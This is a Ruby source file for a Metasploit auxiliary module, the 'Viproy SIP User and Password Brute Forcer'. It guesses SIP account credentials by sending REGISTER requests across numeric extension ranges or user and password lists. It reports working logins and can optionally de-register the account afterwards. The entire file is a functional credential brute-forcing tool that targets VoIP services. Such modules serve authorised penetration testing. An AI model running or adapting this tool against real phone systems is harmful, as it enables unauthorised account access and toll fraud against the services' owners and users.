##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::SIP
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
        'Name'        => 'Viproy SIP User and Password Brute Forcer',
        'Version'     => '1',
        'Description' => 'Brute Force Module for SIP Services',
        'Author'      => 'fozavci',
        'License'     => 'GPL'
    )

    register_options(
        [
            OptInt.new('NUMERIC_MIN',   [true, 'Starting extension',0]),
            OptInt.new('NUMERIC_MAX',   [true, 'Ending extension', 9999]),
            OptBool.new('NUMERIC_USERS',   [true, 'Numeric Username Bruteforcing', false]),
            OptString.new('USERNAME',   [ false, "The login username to probe"]),
            OptString.new('PASSWORD',   [ false, "The login password to probe"]),
            OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users', false]),
            OptString.new('PROTO',   [ true, "Protocol for SIP service (UDP|TCP|TLS)", "UDP"]),
            Opt::RPORT(5060),
        ], self.class)

    register_advanced_options(
        [
            OptString.new('DELAY',   [true, 'Delay in seconds',"0"]),
            OptString.new('USERAGENT',   [ false, "SIP user agent" ]),
            OptBool.new('USER_AS_FROM_and_TO', [true, 'Try the username as the from/to for all users', true]),
            OptString.new('METHOD',   [ true, "The method for Brute Forcing (REGISTER)", "REGISTER"]),
            OptBool.new('DEREGISTER', [true, 'De-Register After Successful Login', false]),
            OptString.new('REALM',   [ false, "The login realm to probe at each host", nil]),
            OptBool.new('REALMFORAUTH',   [ false, "Use the same realm for authorisation"]),
            OptString.new('TO',   [ false, "The destination username to probe", "1000"]),
            OptString.new('FROM',   [ false, "The source username to probe", "1000"]),
            OptString.new('MACADDRESS',   [ false, "MAC Address for Vendor", "000000000000"]),
            OptString.new('VENDOR',   [ true, "Vendor (GENERIC|CISCODEVICE|CISCOGENERIC|MSLYNC)", "GENERIC"]),
            OptString.new('CISCODEVICE',   [ true, "Cisco device type for authentication (585, 7940)", "7940"]),
            OptBool.new('DEBUG',   [ false, "Debug Level", false]),
            OptBool.new('VERBOSE',   [ false, "Whether to print output for all attempts", false]),
        ], self.class)
  end

  def run_host(dest_addr)
    sockinfo={}
    # Protocol parameters
    sockinfo["proto"] = datastore['PROTO'].downcase
    sockinfo["vendor"] = datastore['VENDOR'].downcase
    sockinfo["macaddress"] = datastore['MACADDRESS']

    # Socket parameters
    sockinfo["listen_addr"] = datastore['CHOST']
    sockinfo["listen_port"] = datastore['CPORT']
    sockinfo["dest_addr"] = dest_addr
    sockinfo["dest_port"] = datastore['RPORT']

    method = datastore['METHOD']

    sipsocket_start(sockinfo)
    sipsocket_connect

    if datastore['NUMERIC_USERS'] == true
      passwords = load_password_vars
      if passwords == []
        print_error("PASSWORD or password files are not set.")
        return
      else
        passwords.delete(nil)
      end
      exts=(datastore['NUMERIC_MIN']..datastore['NUMERIC_MAX']).to_a
      vprint_status("Brute force is starting for the numeric range (#{datastore['NUMERIC_MIN'].to_s+"-"+datastore['NUMERIC_MAX'].to_s})")
      exts.each { |ext|
        vprint_status("Testing extension #{ext}...")
        ext=ext.to_s
        from=to=ext if datastore['USER_AS_FROM_and_TO']
        passwords.each {|password|
          do_login(ext,password,from,to,dest_addr,method)
        }
      }
    else
      vprint_status("Brute force is starting for the user list.")
      each_user_pass { |user, password|
        from=to=user if datastore['USER_AS_FROM_and_TO']
        do_login(user,password,from,to,dest_addr,method)
      }
    end

    sipsocket_stop
  end

  def do_login(user,password,from,to,dest_addr,method)

    realm = datastore['REALM']
    user = "#{user}@#{realm}" if datastore['REALMFORAUTH'] == true
    
    Rex.sleep(datastore['DELAY'].to_i)

    results = send_register(
        'login'  	  => true,
        'user'     	=> user,
        'password'	=> password,
        'realm' 	  => realm,
        'from'    	=> from,
        'to'    	  => to
    )

    context = {
        "method"    => "register",
        "user"      => user,
        "password"  => password,
        "print_req" => false
    }

    if realm == nil
      ipr=dest_addr
    else
      ipr="#{dest_addr}:#{realm}"
    end

    if results["status"] =~ /succeed/

    printresults(results,context)
    print_good("#{ipr}\t User: #{user} \tPassword: #{password} \tResult: #{convert_error(results["status"])}")

    # Sending de-register
    if datastore['DEREGISTER'] == true
      #De-Registering User
      send_register(
          'login'  	  => datastore['LOGIN'],
          'user'     	=> user,
          'password'	=> password,
          'realm'     => realm,
          'from'    	=> from,
          'to'    	  => to,
          'expire'    => 0
      )
    end
    else
      if results["rdata"] !=nil
        vprint_status("#{ipr}\t User: #{user} \tPassword: #{password} \tResult: #{convert_error(results["status"])}")
      else
        vprint_status("No response received from #{dest_addr}")
      end
    end
  end
end
